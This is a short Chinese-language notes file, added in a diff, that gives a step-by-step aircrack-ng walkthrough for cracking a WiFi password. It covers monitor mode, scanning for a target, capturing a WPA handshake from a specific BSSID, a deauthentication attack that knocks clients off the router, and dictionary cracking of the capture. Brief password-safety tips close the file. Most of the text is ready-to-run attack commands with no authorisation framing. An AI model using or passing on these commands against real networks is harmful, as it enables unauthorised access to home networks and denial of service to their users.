@@ -1,0 +1,22 @@
+软件 aircrack-ng
+airmon-ng wlan0 up  加载无线网卡
+airmon-ng start wlan0 激活监听模式
+airodump-ng wlan0mon探测攻击目标
+关注PWR ：越大信号越强（负数比大小）   CH：通道    ENC：加密方式 
+
+
+airodump-ng -c 7 --bssid 98:F4:28:4A:68:1C -w /home/wifi/ wlan0mon    抓取握手包
+
+如果无法抓到新开窗口： aireplay-ng -0 0 -a 98:F4:28:4A:68:1C  wlan0mon    冲突攻击迫使路由器断网
+
+aircrack-ng  /home/wifi/-01.cap -w /home/wifi/secret.txt
+windows:   EWSA(GPU加速)
+安全指南：
+	密码：不要使用生日、名字以及电话号码 及其组合
+
+目前wifi 密码只有暴破一种手段或者自己主动暴露：共享WIFI
+
+推荐方式：
+	设置自己的密码然后生成16hash 然后做密码
+
+如果个人家庭网络被拿下，基本上就没什么秘密可言
